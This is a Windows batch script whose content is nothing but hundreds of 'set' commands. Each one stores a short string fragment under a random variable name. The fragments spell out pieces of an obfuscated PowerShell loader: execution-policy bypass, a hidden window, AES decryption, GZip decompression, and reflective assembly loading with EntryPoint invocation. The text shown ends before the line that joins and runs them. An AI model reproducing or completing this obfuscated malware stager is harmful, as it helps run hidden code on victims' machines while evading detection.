@echo off
set "HYmtxOAEBG=py"
set "JhhEpeXkKz=we"
set "JYZpSJoxXY=y "
set "qAJOMoobNJ=.e"
set "aLKnTEZUdL=do"
set "NOpTSyOMZo=ws"
set "FQLBmQabUP=ll"
set "YhdWLqoDiI=st"
set "rXUVobSygz=Wi"
set "eYfmbFHKDN=ll"
set "ARYdBfeFHl= C"
set "BPCLlAdboU=rS"
set "EbIIpcTCkX= /"
set "otUgtaqvsJ=in"
set "kYlKmUbkBX=he"
set "JNCipDWcPz=s\"
set "yvbkkLGqCj=co"
set "HGRiTVYfot=xe"
set "TEewNKaUej=rs"
set "nGyidxPmiE=Sy"
set "UjQBnFmjGV=we"
set "mDveYjehHB=he"
set "AEczMUoVrf=\v"
set "QIxDeBKGxZ=\W"
set "nyMVFgMdFg=1."
set "ZQDivDKqJG=0\"
set "wbdGmvfMcs=:\"
set "KQGDFrzaPR=Po"
set "gmqdPuxdCU=em"
set "LthiSaCznp=32"
set "iZmRyHwXIf=nd"
set "GbIrMFUFhc=ow"
set "StxBtHAVse=po"
set "NwNGKbJhGe=cd"
set "RWMlwixLrt= %~dp0"
set "vYXKZGewkN=-nop"
set "hCYIUJQtJk=v4Ir"
set "tVjrzVMbXm=New-"
set "qGwKQZLqcJ=);$N"
set "lwGNnHHcvL=ispo"
set "fDMIaqGRxQ=Secu"
set "lCKHHLrYiy=esaB"
set "qRPXHPGaTl=.-16"
set "nOVVkmyuhO=null"
set "rSXJMEloka=Comp"
set "GCUWjoLrLx=ptog"
set "dwiMDxtsnC=.Cry"
set "fVEALtfUUW=sion"
set "EkCFhHwITo=g = "
set "hNZRuhzEcS=Fina"
set "oCOqUHVvZl=Obje"
set "KAMnKXLpXH=ZeSE"
set "csSbBIZAyf=n ''"
set "PrSIWtGOnR=Syst"
set "jvEcmGOIdt=7;$N"
set "IdGheaYUDp=ring"
set "rsCDRNYKjP=brea"
set "PUihLLgUnb=('l0"
set "piwJvfzCrQ=ose("
set "RqewpptDeQ=.Sec"
set "gHBgfjjgpX=)))"
set "KlCVkVNxKC=);$N"
set "LQXLCaPBsG=.Len"
set "QrxZUXKhvZ=join"
set "jnWcvYUXgK=sGUc"
set "pqKWpcJgRA=fore"
set "PAEJIMeaMu= '')"
set "KaBswxTuNT=y]::"
set "lRbHRzoBxa=ress"
set "tiLfpwlmQe=ddin"
set "bEbHlCEKeZ=)) {"
set "JqjzbQMJOR=Seo "
set "sIwZIZwRWx=lBlo"
set "QTaRCIOtcb=grap"
set "MZIEBeGtcc=$Mza"
set "MlPFRIbmGk=S46e"
set "kyBGPpuQzg=);$Y"
set "NLAMSToexi=UwRE"
set "rGwCPeauNS=);$Q"
set "WQhoKKjFzB=[Sys"
set "aZJtaNiNwR== [S"
set "WzMHQunkeN=6esa"
set "pcXLMytvdI=esFX"
set "aWunSxHSLW=th('"
set "KLwSDtSOiJ=).Sp"
set "tKFUvxgutk=mory"
set "hRXNHgLTtr=.GZi"
set "wwNWhUDqwC=gnir"
set "jazSDRpGNt=::('"
set "gbRKCybKht=Comp"
set "pbtyvcejmp=in $"
set "RzDKdoxDgF=EF ="
set "msaQSBayEo=morF"
set "CoHwktftST=oArr"
set "xbCYUIvZfD=y.Pa"
set "YTgziJvhMs=NyZ."
set "YpdCYftBnU=$QgW"
set "RPTtRQCrCN=vj0m"
set "wQALrEtyoG=MzaK"
set "zNQDVYRRvP=;$Ze"
set "hSAvTnqQUq=Stre"
set "yUaNoCnAUt==');"
set "OuavdTyRbP=e = "
set "IPsaCyEftp=.Key"
set "JLtbxUdPXL=.Mod"
set "FRlAbDuqro=OyzA"
set "KXGvlvCZRy=yste"
set "TJDnGhIiBS=F'[-"
set "JQuALQqRNL=BC;$"
set "SWOMYjniDl=xASe"
set "CBHJSRQbnj=tS46"
set "NOTrXJIHrE=SEn "
set "byFGaUHQoq=yste"
set "CIUvbgmZOs=File"
set "LKtEEsFxdM=.Cop"
set "jgrQwhdfSb=nirt"
set "xPTiXvVNcq= = $"
set "bxzwNJguqG=[]] "
set "TnZMdWftUF=;$IE"
set "NQMGmkTlaS=bjec"
set "bFeQekvRCk=();$"
set "mEgfcMbGnV=.Ass"
set "qzXewIftqH=Ynxf"
set "TXoVuRsfEq=pose"
set "BgZBBnWzaI=-joi"
set "iFNyQlkSdJ=0O+g"
set "YVlIGLhjdh=  $I"
set "dcePjomjNS=V = "
set "RlmUyTltVI=orF'"
set "iUFOkTrNlY=Obje"
set "heEEPSWvvj=ptor"
set "TCrnSVPfyw=raph"
set "hXAmsSYPjc=ct S"
set "vEmEfjcSol=jVT."
set "yUkYTgEiUW=Fo7l"
set "yxjHYpvACM=oL'["
set "AORFsvLgSw=m.IO"
set "pIRWouINmv=..-1"
set "ldhSBVjpni=3HWs"
set "zfPumAfWcx=nd);"
set "CISJymJREy= = ["
set "KzAxAxIuyd=pose"
set "mhPJpixBcA=nd.T"
set "EGLiNXHAzZ=EF);"
set "fHAKYlqWSA=F = "
set "TqRcEaVVMm=ment"
set "daCTvxUFnM=]::("
set "VdnvlnqazL=CFK."
set "JCYbmLtsdn=urit"
set "PZFjMzewCh=flec"
set "zsctryZKbJ=eam("
set "PQJpOedLfo=iron"
set "FcYNznBjaD=FK, "
set "TLmiAFYvck=PKCS"
set "KyrseHZsTc=.Dis"
set "fDcNhxLOiF=ach "
set "jwLpsDxyrb=1] -"
set "YOvLjSEpfO=ert]"
set "ERrWQxRzox=form"
set "ZOkkXVSuiy=Secu"
set "mSAHPfssFY=ress"
set "mUJJcGuPGY=tsWi"
set "WNNKSdcDBB=ecry"
set "JoTZcuNrWL=.Con"
set "QRzNGIScHF=lit("
set "BANpaPxdAm=yste"
set "JQgXAOGbPG=('%*'"
set "mWqARPtCLq=u) {"
set "eyiUfEfRTb= [st"
set "dJvaSUenWu=();$"
set "FklHRYzGcM=736u"
set "bIoNQVHvZH=onve"
set "AZcQMsmruv=gth)"
set "YshzZrWsez=pres"
set "PjOBOTFzzY=m.IO"
set "pudiNbpIvD=odZA"
set "jESmrqvISZ=gWnd"
set "poSDmIsPZL='[-1"
set "fMWIIwuAby=n.En"
set "fzRjXbiFVy=:: '"
set "GNArtwfRac=Ku ="
set "pTPlsVjUZc=odZA"
set "uktBCANRTi=);$I"
set "AixFxHokaD=A.Pa"
set "qhVDvEOKrr=$QgW"
set "rXOgAMfJYg=UwRE"
set "mUgoScFsJg=$jWj"
set "TyZcmxHXON=ay()"
set "lByUjdhgNx=trea"
set "MOoTwOPDwi=[IO."
set "wsSjgSDeqM=rity"
set "lfyIcTpQaR=ode]"
set "HiqJrVspUH=Plwk"
set "ijxsuARPzU=k; }"
set "CFNJQjaFRj= [Sy"
set "SGTuQhjMCQ=-4] "
set "VmTzZVurnR=F, 0"
set "mawSedDiVL=d;$N"
set "LRdjWrEGAF='gni"
set "PRhNlBkMNX=aPCF"
set "XjDUblhuBm=ypto"
set "twNoFIZNro=]::C"
set "svCnsKiEFd=am;$"
set "dIGzLmjGGb=+hAO"
set "QjWpACAQfI=wREF"
set "rrwtkAYUhX=] -j"
set "hwFdUZikYB=ewLi"
set "botDhTLfpw=..-1"
set "InTQeEZVcA=e]::"
set "yeXdCjbdLk=bstr"
set "OndUBitsLD=ose("
set "BLOjBYfrnc=.IO."
set "UZCOLdeClz=o.Su"
set "FdCuCkXiDU=$Nod"
set "dHDkAAHuvk=tem."
set "pOQONtFcJG=fV.D"
set "lkEwBudDzO=em.C"
set "gEpryyqdSS=vert"
set "jdNTcyhPpJ=)($I"
set "UUJgSzZdaa=esMa"
set "ebyFmtWctZ=pher"
set "xOHuvbZRIo=Disp"
set "avMYjHxZRC=bypa"
set "uElMcUvKFv=.Com"
set "bOLxUPERHy=rofi"
set "EzfxUJuNQG=odZA"
set "znhOiGqJbp=jVT "
set "yFpkvddVJE=pDZz"
set "sQiFUZoGUk=UwRE"
set "nGNBUUbprW=Mode"
set "yUWBgxmfxT=3); "
set "wrerUXgiRq=$QgW"
set "lMvoMnmJHf=stem"
set "PMgCyoZAJr=]::N"
set "FlMxbQSQwQ=tem."
set "eaqWqkSAga=('da"
set "OUPOBzSGla=Invo"
set "LucMfBoRXR=[Sys"
set "sBZxwYZwIZ= '')"
set "LmzMvwtpUd=ress"
set "tLoLefUQXl=em.I"
set "HpzfZoAgvg=Bmor"
set "RVXXnXirCK=New-"
set "fcdnbKpaGT=;$aP"
set "mZGRgbmuHv=rtS4"
set "OKmpQieqyQ=ss -"
set "SLXlHIPNQq=($xA"
set "vwkEnHzmfw=odZA"
set "eAeABhjNTk='[-1"
set "lPvdlcrlKP=Syst"
set "uzJslqrsOC=ionM"
set "GCMfTmDFzX=stem"
set "RQSCerevie=:('g"
set "cmTHljZAgq=le  "
set "ClQRBjwfIm=t Sy"
set "BoYcgfEHeC=m.Re"
set "MImykjpxdc=VT.T"
set "DZRRwnBCnj=nage"
set "aZDQlyMIpz=, $U"
set "zuOoFhbrBE=ke($"
set "XDdIzByOCQ=y.Ci"
set "mjgDaNqklk=UGTu"
set "uWXaPAjVOe=daeR"
set "KyqwHhQQVC=.Cry"
set "LqlEcuxWDN== $N"
set "mHckqyRwJi=ZA.I"
set "csQwUmfwtC=1..-"
set "HgfNZHBRZc=isfL"
set "YFBYvmmAyA=ect "
set "mJarCUrqHN=ck($"
set "ABgAttKryn=;$jW"
set "FxFCZaqCDn= [Sy"
set "MnxosuQVss=rans"
set "NnQJSFkdvG= New"
set "TrbZaDhwXe=; };"
set "swbQxldNIF=-1.."
set "fFTpxIWaMM=oint"
set "IlqIZQggCi=Disp"
set "NwxIlnkRwP=yTo("
set "mkzKrWvxSV='dqR"
set "xwoeIytgyd=odZA"
set "JXNNsfRdfD=$Ynx"
set "HjTVeGVLsT=stem"
set "LFJHyHAVxD=and "
set "BpMrQzGmDk=nxfV"
set "gTiuaLrtqd=();$"
set "zbTVlKoYOq=oryS"
set "QLcmcIgAcu=F = "
set "LeIlKozdlN=n ''"
set "fIYLdXXzOk=wREF"
